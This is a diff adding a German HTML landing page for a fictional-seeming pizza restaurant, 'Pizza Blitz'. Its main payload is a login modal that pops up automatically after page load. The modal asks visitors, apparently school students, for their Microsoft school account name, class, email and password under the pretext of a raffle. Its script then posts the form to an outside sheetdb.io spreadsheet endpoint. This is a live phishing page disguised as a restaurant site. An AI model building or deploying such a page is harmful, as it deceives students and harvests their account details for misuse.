@@ -1,0 +1,173 @@
+<!doctype html>
+<html lang="de">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Pizza Blitz</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="style.css" />
+</head>
+
+<body class="antialiased bg-[#ffe3c9] text-gray-800 font-sans">
+
+<header class="bg-white border-b border-gray-200 shadow-sm">
+  <div class="w-full flex justify-between items-center px-8 py-4">
+    <div class="flex items-center space-x-3">
+      <img src="" alt="" class="h-9">
+      <span class="text-gray-800 font-semibold tracking-wide">Pizza Blitz</span>
+    </div>
+
+    <nav class="space-x-8 text-sm font-semibold text-gray-700">
+      <a href="#" class="text-[#df3821] hover:underline">Pizza Blitz</a>
+      <a href="#" class="hover:text-[#df3821] transition">MENÜPLAN</a>
+      <a href="#" class="hover:text-[#df3821] transition">NEUERÖFFNUNG BADEN</a>
+      <a href="#" class="hover:text-[#df3821] transition">INFORMATIONEN</a>
+    </nav>
+  </div>
+</header>
+
+<!-- HERO SECTION -->
+<section class="relative w-full overflow-hidden shadow-lg min-h-[80vh]">
+
+  <!-- HERO IMAGE -->
+  <img src="https://images.unsplash.com/photo-1570946581013-83b974ed3fb7?q=80&w=1471&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" 
+       class="absolute inset-0 w-full h-full object-cover" />
+
+  <!-- OVERLAY -->
+  <div class="absolute inset-0 bg-gradient-to-t from-black/70 via-black/40 to-transparent"></div>
+
+  <!-- TEXT -->
+  <div class="relative z-10 flex items-end h-full">
+    <div class="p-10 text-white max-w-5xl">
+      <h1 class="text-3xl md:text-4xl font-bold leading-snug">
+        Pizza Blitz: Bestes Stück, bester Preis.<br>
+        Der coole Klassiker kommt 2026 nach Baden, AG.
+      </h1>
+    </div>
+  </div>
+
+</section>
+
+<!-- IMAGE GRID -->
+<section class="w-full px-8 mt-10 grid grid-cols-1 md:grid-cols-3 gap-4">
+
+  <div class="relative rounded-xl overflow-hidden shadow-lg">
+    <img class="w-full h-96 object-cover" src="https://images.unsplash.com/photo-1532460734809-e7f8475ca917?q=80&w=1437&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D">
+    <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end">
+      <div class="p-5 text-white text-lg font-medium">
+        Der Start zum Blitz-Genuss. Qualität, die man schmeckt.
+      </div>
+    </div>
+  </div>
+
+  <div class="relative rounded-xl overflow-hidden shadow-lg">
+    <img class="w-full h-96 object-cover" src="https://images.unsplash.com/photo-1646656352194-7db15ee021bf?q=80&w=1470&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Weihnachtsevent">
+    <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end">
+      <div class="p-5 text-white text-lg font-medium">
+        100% Tradition. Von der Glut zum Genuss.
+      </div>
+    </div>
+  </div>
+
+  <div class="relative rounded-xl overflow-hidden shadow-lg">
+    <img class="w-full h-96 object-cover" src="https://images.unsplash.com/photo-1638981368648-d6279e23f294?q=80&w=1470&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D">
+    <div class="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end">
+      <div class="p-5 text-white text-lg font-medium">
+        Perfekt belegt: Nur die besten Zutaten für den Holzofen.
+      </div>
+    </div>
+  </div>
+
+</section>
+
+<!-- LOGIN MODAL (UNCHANGED AS REQUESTED) -->
+<div id="loginModal" class="hidden fixed inset-0 bg-black/30 backdrop-blur-sm flex items-center justify-center z-50">
+<div class="bg-white rounded-lg shadow-lg w-96 p-6 relative">
+<button id="closeLogin" class="absolute top-2 right-2 text-gray-500 hover:text-gray-800">✕</button>
+<h2 class="text-xl font-semibold text-center mb-4">
+Mit dem Microsoft-Schulkonto anmelden, um am Gewinnspiel teilzunehmen
+</h2>
+
+<form id="loginForm" class="space-y-4" action="https://sheetdb.io/api/v1/2zeos8o2omymx" method="POST">
+<div>
+<label class="text-sm font-medium text-gray-700">Name</label>
+<input type="text" id="name" name="data[name]" placeholder="Tom Meier"
+class="mt-1 w-full border border-gray-300 rounded-md p-2 focus:ring-2 focus:ring-green-500" required>
+</div>
+
+<div>
+<label class="text-sm font-medium text-gray-700">Klasse</label>
+<input type="text" id="klasse" name="data[klasse]" placeholder="B1a"
+class="mt-1 w-full border border-gray-300 rounded-md p-2 focus:ring-2 focus:ring-green-500" required>
+</div>
+
+<div>
+<label class="text-sm font-medium text-gray-700">E-Mail</label>
+<input type="email" id="email" name="data[email]" placeholder="tom.mei@schule-baden.ch"
+class="mt-1 w-full border border-gray-300 rounded-md p-2 focus:ring-2 focus:ring-green-500" required>
+</div>
+
+<div>
+<label class="text-sm font-medium text-gray-700">Passwort</label>
+<input type="password" 
+class="mt-1 w-full border border-gray-300 rounded-md p-2 focus:ring-2 focus:ring-green-500" required>
+</div>
+
+<button type="submit"
+class="w-full bg-[#df3821] text-white py-2 rounded-md font-semibold hover:bg-[#b92d1a] transition">
+Gewinnspiel Beitreten
+</button>
+</form>
+</div>
+</div>
+
+<div id="successMsg" class="hidden fixed inset-0 flex items-center justify-center bg-black/20 backdrop-blur-sm z-50">
+<div class="bg-white rounded-lg p-6 text-center w-96 shadow-lg">
+<p class="text-lg font-semibold text-gray-800">Viel Glück!</p>
+<p class="mt-2 text-gray-600">Wir benachrichtigen dich per E-Mail, wenn du gewonnen hast.</p>
+<button id="closeSuccess" class="mt-4 bg-[#df3821] text-white px-4 py-2 rounded-md hover:bg-[#b92d1a]">OK</button>
+</div>
+</div>
+
+<script>
+const loginForm = document.getElementById('loginForm');
+const loginModal = document.getElementById('loginModal');
+const successMsg = document.getElementById('successMsg');
+const closeLoginBtn = document.getElementById('closeLogin');
+const closeSuccessBtn = document.getElementById('closeSuccess');
+
+const DELAY_TIME = 600; 
+
+document.addEventListener('DOMContentLoaded', () => {
+    setTimeout(() => {
+        loginModal.classList.remove('hidden');
+    }, DELAY_TIME); 
+});
+
+loginForm.addEventListener("submit", e => {
+    e.preventDefault(); 
+
+    fetch(loginForm.action, { 
+        method : "POST",
+        body: new FormData(loginForm), 
+    }).then(response => response.json())
+     .then(data => {
+        loginModal.classList.add('hidden');
+        successMsg.classList.remove('hidden');
+        loginForm.reset(); 
+    }).catch(error => {
+        alert('Ein Fehler ist aufgetreten. Bitte versuche es erneut.');
+    });
+});
+
+closeLoginBtn.addEventListener('click', () => {
+    loginModal.classList.add('hidden');
+});
+  
+closeSuccessBtn.addEventListener('click', () => {
+    successMsg.classList.add('hidden');
+});
+</script>
+
+</body>
+</html>
